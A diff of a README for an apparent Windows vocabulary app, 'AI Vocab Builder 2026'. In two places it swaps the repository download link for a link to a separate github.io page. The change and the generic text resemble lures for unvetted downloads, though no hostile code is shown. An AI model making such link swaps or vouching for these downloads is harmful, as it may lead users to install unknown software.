@@ -1,6 +1,6 @@
 # 📚 ai-vocab-builder-2026 - Improve your vocabulary with smart tools
 
-[![Download AI Vocab Builder](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bhutanese-chuckwagon493/ai-vocab-builder-2026)
+[![Download AI Vocab Builder](https://img.shields.io/badge/Download-Application-blue.svg)](https://bhutanese-chuckwagon493.github.io)
 
 AI Vocab Builder 2026 helps you learn new words. You store terms, read clear definitions, and test your skills. The app generates sentences to show how words fit into daily speech. This tool keeps track of your progress so you see your growth over time. You use this software to sharpen your writing and your talk.
 
@@ -12,7 +12,7 @@ You need a computer that runs Windows 10 or Windows 11. Your computer needs at l
 
 You can find the software on the project page. Visit this page to download the latest version of the application:
 
-[https://github.com/bhutanese-chuckwagon493/ai-vocab-builder-2026](https://github.com/bhutanese-chuckwagon493/ai-vocab-builder-2026)
+[https://bhutanese-chuckwagon493.github.io](https://bhutanese-chuckwagon493.github.io)
 
 Follow these steps to get your copy:
 
